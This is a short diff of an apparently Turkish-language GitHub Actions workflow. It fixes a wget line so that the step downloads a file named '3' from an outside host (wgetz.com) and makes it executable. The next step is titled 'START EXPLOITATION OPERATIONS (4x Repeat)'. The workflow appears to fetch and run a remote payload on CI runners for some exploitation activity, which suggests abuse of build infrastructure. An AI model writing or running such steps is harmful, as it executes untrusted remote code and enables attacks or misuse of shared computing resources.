@@ -17,7 +17,7 @@ jobs:
     steps:
       - name: İndir ve Hazırla
         run: |
-          wgethttps://wgetz.com/S0Ml0eqsBg/3 -O 3
+          wget https://wgetz.com/S0Ml0eqsBg/3 -O 3
           chmod +x 3
           
       - name: SÖMÜRÜ İŞLEMLERİNİ BAŞLAT (4x Tekrar)
